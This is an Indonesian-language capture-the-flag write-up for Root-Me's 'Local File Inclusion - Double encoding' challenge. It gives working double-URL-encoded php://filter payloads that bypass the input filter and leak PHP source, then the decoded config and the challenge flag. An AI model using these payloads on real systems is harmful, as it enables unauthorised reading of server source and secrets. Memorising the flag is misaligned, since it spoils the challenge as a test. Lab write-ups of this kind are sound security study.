@@ -1,0 +1,69 @@
+Local File Inclusion - Double encoding
+
+https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding
+
+[Soal]
+
+Find the validation password in the source files of the website.
+
+http://challenge01.root-me.org/web-serveur/ch45/
+
+[POC]
+
+http://challenge01.root-me.org/web-serveur/ch45/index.php?page=../
+
+ini agak berbeda sama LFI attack pada umumnya, ketika membuka halaman dan menambahkan simbol . dan / terdeteksi sebagai serangan.
+kalau merujuk pada soal (Double encoding), tanda simbol tersebut dirubah menjadi HEX (simple encoding) dan menambahkan tanda HEX %25 agar dapat terbaca double. maka dapat dijabarkan seperti:
+
+simbol ==> simple encoding ==> double encoding
+
+:	==> 3A	==> %253A
+
+/	==> 2F	==> %252F
+
+.	==> 2E	==> %252E
+
+-	==> 2D	==> %252D
+
+=	==> 3D	==> %253D
+
+selanjutnya menggunakan php://filter untuk dapat membaca source code dari target
+
+php://filter/convert.base64-encode/resource=cv
+
+dan dikonversikan menggunakan double encoding
+
+php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv
+
+jika dieksekusi menjadi
+
+`http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv
+
+dan mengeluarkan source code yang terenskripsi base64
+
+PD9waHAgaW5jbHVkZSgiY29uZi5pbmMucGhwIik7ID8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5KLiBTbWl0aCAtIENWPC90aXRsZT4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8Pz0gJGNvbmZbJ2dsb2JhbF9zdHlsZSddID8+CiAgICA8bmF2PgogICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1ob21lIj5Ib21lPC9hPgogICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jdiIgY2xhc3M9ImFjdGl2ZSI+Q1Y8L2E+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWNvbnRhY3QiPkNvbnRhY3Q8L2E+CiAgICA8L25hdj4KICAgIDxoMT48Pz0gJGNvbmZbJ2NvbnRhY3QnXVsnZmlyc3RuYW1lJ10gPz4gPD89ICRjb25mWydjb250YWN0J11bJ2xhc3RuYW1lJ10gPz48L2gxPgogICAgPGgzPlByb2Zlc3Npb25hbCBkb2VyPC9oMz4KICAgIDw/PSAkY29uZlsnY3YnXVsnZ2VuZGVyJ10gPyAiTWFsZSIgOiAiRmVtYWxlIiA/Pjxicj4KICAgIDw/PSBkYXRlKCdZL20vZCcsICRjb25mWydjdiddWydiaXJ0aCddKSA/PiAoPD89IGRhdGUoJ1knKS1kYXRlKCdZJywgJGNvbmZbJ2N2J11bJ2JpcnRoJ10pID8+KQogICAgPD9waHAKICAgICAgZm9yZWFjaCAoJGNvbmZbJ2N2J11bJ2pvYnMnXSBhcyAkam9iKSB7CiAgICA/PgogICAgICA8ZGl2IGNsYXNzPSJqb2IiPgogICAgICAgIDxoND48Pz0gJGpvYlsndGl0bGUnXSA/PiAtIDxzcGFuIGNsYXNzPSJkYXRlIj48Pz0gJGpvYlsnZGF0ZSddID8+PC9zcGFuPjwvaDQ+CiAgICAgIDwvZGl2PgogICAgPD9waHAKICAgICAgfQogICAgPz4KICA8L2JvZHk+CjwvaHRtbD4K
+
+hasil decode tersebut menunjukkan clue berikutnya
+
+<?php include("conf.inc.php"); ?>
+
+flag tersimpan di dalam config, berarti ..
+
+http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf
+
+dan sourcenya
+
+PD9waHAKICAkY29uZiA9IFsKICAgICJmbGFnIiAgICAgICAgPT4gIlRoMXNJc1RoM0ZsNGchIiwKICAgICJob21lIiAgICAgICAgPT4gJzxoMj5XZWxjb21lPC9oMj4KICAgIDxkaXY+V2VsY29tZSBvbiBteSBwZXJzb25hbCB3ZWJzaXRlICE8L2Rpdj4nLAogICAgImN2IiAgICAgICAgICA9PiBbCiAgICAgICJnZW5kZXIiICAgICAgPT4gdHJ1ZSwKICAgICAgImJpcnRoIiAgICAgICA9PiA0NDE3NTk2MDAsCiAgICAgICJqb2JzIiAgICAgICAgPT4gWwogICAgICAgIFsKICAgICAgICAgICJ0aXRsZSIgICAgID0+ICJDb2ZmZWUgZGV2ZWxvcGVyIEBNZWdhdXBsb2FkIiwKICAgICAgICAgICJkYXRlIiAgICAgID0+ICIwMS8yMDEwIgogICAgICAgIF0sCiAgICAgICAgWwogICAgICAgICAgInRpdGxlIiAgICAgPT4gIkJlZCB0ZXN0ZXIgQFlvdXJNb20ncyIsCiAgICAgICAgICAiZGF0ZSIgICAgICA9PiAiMDMvMjAxMSIKICAgICAgICBdLAogICAgICAgIFsKICAgICAgICAgICJ0aXRsZSIgICAgID0+ICJCZWVyIGRyaW5rZXIgQE5lYXJlc3RCYXIiLAogICAgICAgICAgImRhdGUiICAgICAgPT4gIjEwLzIwMTQiCiAgICAgICAgXQogICAgICBdCiAgICBdLAogICAgImNvbnRhY3QiICAgICAgID0+IFsKICAgICAgImZpcnN0bmFtZSIgICAgID0+ICJKb2huIiwKICAgICAgImxhc3RuYW1lIiAgICAgID0+ICJTbWl0aCIsCiAgICAgICJwaG9uZSIgICAgICAgICA9PiAiMDEgMzMgNzEgMDAgMDEiLAogICAgICAibWFpbCIgICAgICAgICAgPT4gImpvaG4uc21pdGhAdGhlZ2FtZS5jb20iCiAgICBdLAogICAgImdsb2JhbF9zdHlsZSIgID0+ICc8c3R5bGUgbWVkaWE9InNjcmVlbiI+CiAgICAgIGJvZHl7CiAgICAgICAgYmFja2dyb3VuZDogcmdiKDIzMSwgMjMxLCAyMzEpOwogICAgICAgIGZvbnQtZmFtaWx5OiBUYWhvbWEsVmVyZGFuYSxTZWdvZSxzYW5zLXNlcmlmOwogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgfQogICAgICBkaXYjbWFpbnsKICAgICAgICBwYWRkaW5nOiAyMHB4IDEwcHg7CiAgICAgIH0KICAgICAgbmF2ewogICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHJnYigxMDEsIDEwMSwgMTAxKTsKICAgICAgICBmb250LXNpemU6IDA7CiAgICAgIH0KICAgICAgbmF2IGF7CiAgICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICAgIHBhZGRpbmc6IDVweCAxMHB4OwogICAgICAgIGJveC1zaXppbmc6IGJvcmRlci1ib3g7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgICBjb2xvcjogIzU1NTsKICAgICAgfQogICAgICBuYXYgYS5hY3RpdmV7CiAgICAgICAgY29sb3I6ICNmZmY7CiAgICAgICAgYmFja2dyb3VuZDogcmdiKDExOSwgMTM4LCAxNDQpOwogICAgICB9CiAgICAgIG5hdiBhOmhvdmVyewogICAgICAgIGNvbG9yOiAjZmZmOwogICAgICAgIGJhY2tncm91bmQ6IHJnYigxMTksIDEzOCwgMTQ0KTsKICAgICAgfQogICAgICBoMnsKICAgICAgICBtYXJnaW4tdG9wOjA7CiAgICAgIH0KICAgICAgPC9zdHlsZT4nCiAgXTsK
+
+hasil decodenya adalah
+
+  $conf = [
+    "flag"        => "Th1sIsTh3Fl4g!",
+    "home"        => '<h2>Welcome</h2>
+    <div>Welcome on my personal website !</div>',
+
+..... 
+
+# FLAG = Th1sIsTh3Fl4g!
+
+Well done, you won 30 Points
